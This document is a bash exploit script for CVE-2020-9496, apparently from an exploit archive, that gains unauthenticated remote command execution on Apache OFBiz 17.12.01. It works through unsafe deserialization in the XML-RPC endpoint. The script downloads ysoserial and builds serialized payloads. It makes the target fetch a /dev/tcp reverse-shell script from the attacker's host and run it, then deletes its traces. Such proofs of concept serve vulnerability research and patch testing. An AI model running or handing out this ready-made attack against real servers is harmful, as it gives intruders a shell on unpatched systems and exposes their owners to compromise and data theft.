# Exploit Title: ApacheOfBiz 17.12.01 - Remote Command Execution (RCE) via Unsafe Deserialization of XMLRPC arguments
# Date: 2021-08-04
# Exploit Author: Álvaro Muñoz, Adrián Díaz (s4dbrd)
# Vendor Homepage: https://ofbiz.apache.org/index.html
# Software Link: https://archive.apache.org/dist/ofbiz/apache-ofbiz-17.12.01.zip
# Version: 17.12.01
# Tested on: Linux

# CVE : CVE-2020-9496

# Reference: https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz/

# Description: This CVE was discovered by Alvaro Muñoz, but I have created this POC to automate the process and the necessary requests to successfully exploit it and get RCE.

#!/usr/bin/env bash

# Because the 2 xmlrpc related requets in webtools (xmlrpc and ping) are not using authentication they are vulnerable to unsafe deserialization.
# This issue was reported to the security team by Alvaro Munoz pwntester@github.com from the GitHub Security Lab team.
#
# This vulnerability exists due to Java serialization issues when processing requests sent to /webtools/control/xmlrpc.
# A remote unauthenticated attacker can exploit this vulnerability by sending a crafted request. Successful exploitation would result in arbitrary code execution.
#
# Steps to exploit:
#
# Step 1: Host HTTP Service with python3 (sudo python3 -m http.server 80)
# Step 2: Start nc listener (Recommended 8001).
# Step 3: Run the exploit.


url='https://127.0.0.1' # CHANGE THIS
port=8443 # CHANGE THIS

function helpPanel(){
    echo -e "\nUsage:"
    echo -e "\t[-i] Attacker's IP"
    echo -e "\t[-p] Attacker's Port"
    echo -e "\t[-h] Show help pannel"
    exit 1
}


function ctrl_c(){
    echo -e "\n\n[!] Exiting...\n"
    exit 1
}
# Ctrl + C
trap ctrl_c INT

function webRequest(){
    echo -e "\n[*] Creating a shell file with bash\n"
    echo -e "#!/bin/bash\n/bin/bash -i >& /dev/tcp/$ip/$ncport 0>&1" > shell.sh
    echo -e "[*] Downloading YsoSerial JAR File\n"
    wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.jar
    echo -e "[*] Generating a JAR payload\n"
    payload=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "wget $ip/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n")
    echo -e "[*] Sending malicious shell to server...\n" && sleep 0.5
    curl -s $url:$port/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload</serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml' &>/dev/null
    echo -e "[*] Generating a second JAR payload"
    payload2=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n")
    echo -e "\n[*] Executing the payload in the server...\n" && sleep 0.5
    curl -s $url:$port/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload2</serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml' &>/dev/null
    echo -e "\n[*]Deleting Files..."
    rm ysoserial-master-d367e379d9-1.jar && rm shell.sh
}

declare -i parameter_enable=0; while getopts ":i:p:h:" arg; do
    case $arg in
        i) ip=$OPTARG; let parameter_enable+=1;;
        p) ncport=$OPTARG; let parameter_enable+=1;;
        h) helpPanel;;
    esac
done

if [ $parameter_enable -ne 2 ]; then
    helpPanel
else
    webRequest
fi